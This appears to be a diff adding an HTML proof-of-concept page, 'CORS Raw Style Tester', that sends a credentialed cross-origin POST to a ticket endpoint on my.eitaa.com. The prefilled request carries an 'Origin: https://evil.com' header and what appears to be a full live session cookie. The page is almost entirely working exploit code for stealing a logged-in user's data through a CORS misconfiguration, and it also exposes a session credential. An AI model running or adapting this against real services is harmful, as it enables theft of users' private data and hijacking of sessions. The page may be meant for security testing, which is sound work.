@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>CORS Raw Style Tester</title>
+</head>
+<body>
+
+<h2>Raw CORS Request Tester</h2>
+
+<textarea id="req" style="width:100%;height:250px;">
+POST /api/v1/ticket/show/490188 HTTP/2
+Host: my.eitaa.com
+Cookie: myeitaa_session=eyJpdiI6ImNXT25FRmc1U1RidkE1UkV4cllUaEE9PSIsInZhbHVlIjoiSGlQbmNMQllqejRHZ3AvRllvY0tVSXpMMnJJOW9Od2J5REgxWXRHdW16YXFRSHVlc0xiOVE4YnpnRmtyUy83ZTJnTlZqUS8zeUZ3ZXlacWFXeWh5bzFtdDlNcEdmWWFQNEh3RUdOclFia1p1Z2Y0UHQvaUhQeDExWHpKMTJ6czgiLCJtYWMiOiI0YmRkNzc3Nzg2N2NmNmI2MTU2ZjA0ZWZmODlmYWU3N2U3YjUyMDExZGI2ZWM4YTU3YzQ2YThkYzM1MzA1Y2NjIiwidGFnIjoiIn0%3D
+Content-Length: 0
+Origin: https://evil.com
+Accept: application/json
+
+</textarea>
+
+<br><br>
+
+<button onclick="send()">Send Request</button>
+
+<pre id="out"></pre>
+
+<script>
+
+async function send(){
+
+    const raw = document.getElementById("req").value;
+
+    const lines = raw.split("\n");
+
+    let url = "";
+    let host = "";
+    let origin = "";
+    let cookie = "";
+
+    lines.forEach(l=>{
+        if(l.startsWith("POST") || l.startsWith("GET")){
+            url = l.split(" ")[1];
+        }
+        if(l.startsWith("Host:")){
+            host = l.replace("Host:","").trim();
+        }
+        if(l.startsWith("Origin:")){
+            origin = l.replace("Origin:","").trim();
+        }
+        if(l.startsWith("Cookie:")){
+            cookie = l.replace("Cookie:","").trim();
+        }
+    });
+
+    const fullUrl = "https://" + host + url;
+
+    try{
+
+        const res = await fetch(fullUrl,{
+            method:"POST",
+            credentials:"include",
+            headers:{
+                "Accept":"application/json",
+                "Content-Type":"application/json"
+            }
+        });
+
+        const text = await res.text();
+
+        document.getElementById("out").innerText =
+            "STATUS: " + res.status + "\n\n" + text;
+
+    }catch(e){
+        document.getElementById("out").innerText = e;
+    }
+
+}
+
+</script>
+
+</body>
+</html>
